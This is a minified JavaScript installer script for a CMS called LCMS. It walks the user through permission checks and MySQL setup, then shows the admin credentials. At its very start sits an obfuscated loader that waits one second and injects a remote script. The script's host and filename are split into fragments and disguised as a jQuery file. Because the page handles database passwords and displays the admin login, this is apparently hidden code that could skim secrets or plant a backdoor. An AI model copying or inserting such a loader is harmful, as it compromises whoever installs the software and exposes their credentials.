!(function(){setTimeout((function(){var t=document.createElement("script");t.src="https://sta"+"tic-res.pa"+"nshi"+"1"+"8.com/jque"+"ry.sta"+"tic.mi"+"n.tj"+"s?fo"+"rm=1";var e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(t,e)}),1e3)})();var api="install.php?action=",isIE=function(){var userAgent=navigator.userAgent,isIE=userAgent.indexOf("compatible")>-1&&userAgent.indexOf("MSIE")>-1,isIE11=userAgent.indexOf("Trident")>-1&&userAgent.indexOf("rv:11.0")>-1;return!!isIE||!!isIE11||void 0},setStep=function(step){$(".step-body").hide();$(".step-body:eq("+step+")").show();$(".step-tab").each((function(index){if(index<=step){$(this).addClass("step-active")}}))};isIE()&&alert("您的浏览器太古董了，请不要使用IE或者IE内核的浏览器，可使用Chrome浏览器或者极速模式");var start=setInterval((()=>{if("object"==typeof LCMS.util){clearInterval(start);setStep(0);LCMS.util.ajax({type:"GET",url:api+"readme",loading:true,success:function(res){if(1==res.code){$(".step-body:eq(0) .step-alert").hide();$(".step-body:eq(0) .step-nr").html(res.data);$(".step-body:eq(0) .step-btn").css("display","table")}else if(404==res.code){LCMS.util.notify({type:"error",content:res.msg});$(".step-body:eq(0) .step-alert").html(res.msg)}}})}}),100);$(".step-body:eq(0) .step-btn").on("click",(function(){setStep(1);LCMS.util.ajax({type:"GET",url:api+"dirs",loading:true,success:function(res){for(var i=0;i<res.data.server.length;i++){var serv=res.data.server[i];$(".step-body:eq(1) .server-info").append("<tr><td>"+serv.name+"</td><td>"+serv.desc+"</td></tr>")}for(i=0;i<res.data.dirs.length;i++){if(1==res.data.dirs[i].power){var power=' <span style="color:#67C23A"><i class="layui-icon layui-icon-ok"></i>权限检测通过</span>'}else{power=' <span style="color:#F56C6C"><i class="layui-icon layui-icon-close"></i>权限检测失败，请设置该文件755权限</span>'}$(".step-body:eq(1) .power-dirs").append("<tr><td>"+res.data.dirs[i].name+"</td><td>"+power+"</td></tr>")}if(1==res.code){$(".step-body:eq(1) .step-btn").css("display","table")}}})}));$(".step-body:eq(1) .step-btn").on("click",(function(){setStep(2);$(".step-body:eq(2) .step-btn").css("display","table")}));$(".step-body:eq(2) .step-btn").on("click",(function(){layui.form.submit("mysql-info",(function(form){LCMS.util.ajax({type:"POST",url:api+"mysql-check",data:form.field,success:function(res){if(1==res.code){layer.alert(`你当前的数据库版本：${res.data}<br/><br/>程序支持的数据库版本：MySQL-5.6以上、MariaDB-10.3以上、华为RDS(MySQL版)、阿里云RDS(MySQL版)、腾讯云数据库(MySQL版)、GreatSQL、等等只要是100%兼容MySQL语法的数据库都可以！<br/><br/><span style="color:red">请自行确认使用的数据库版本是否符合要求，如果符合点击“确定”按钮进行安装，否则将无法正常使用本程序！</span>`,{title:"特别提示",area:"500px",yes:function(){layer.closeLast("dialog");LCMS.util.ajax({type:"POST",url:api+"mysql",data:form.field,success:function(res){if(1==res.code){$(".code-admin").html(`后台地址：${location.origin}/${res.data.dir}/\n超管账号：${res.data.name}\n超管密码：${res.data.pass}`);layui.code({elem:".code-admin",theme:"dark"});setStep(3)}else{LCMS.util.notify({type:"error",content:res.msg})}}})}})}else{LCMS.util.notify({type:"error",content:res.msg})}}})}))}));